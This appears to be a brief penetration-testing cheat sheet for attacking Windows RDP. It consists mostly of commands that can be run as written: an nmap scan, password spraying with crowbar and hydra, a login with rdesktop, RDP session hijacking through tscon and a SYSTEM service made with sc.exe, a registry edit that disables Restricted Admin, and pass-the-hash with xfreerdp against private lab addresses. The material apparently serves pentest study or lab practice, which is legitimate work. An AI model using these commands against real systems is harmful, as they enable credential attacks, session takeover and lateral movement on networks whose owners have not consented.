
TCP/3389

```shell-session
nmap -Pn -p3389 192.168.2.143 
```

- Password spraying
```shell-session
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
```shell-session
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

Login:
```shell-session
rdesktop -u admin -p password123 192.168.2.143
```

##### RDP Session Hijacking
- must have SYSTEM privileges
- Use PsExec or Mimikatz to escalate privileges if local admin
```cmd-session
query user
```
```cmd-session
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

sc.exe create sessionhijack binpath= "cmd.exe /k tscon 4 /dest:rdp-tcp#13"

```cmd-session
net start sessionhijack
```

##### Pass the Hash

Add registry key to disable restricted admin
```cmd-session
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
```shell-session
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

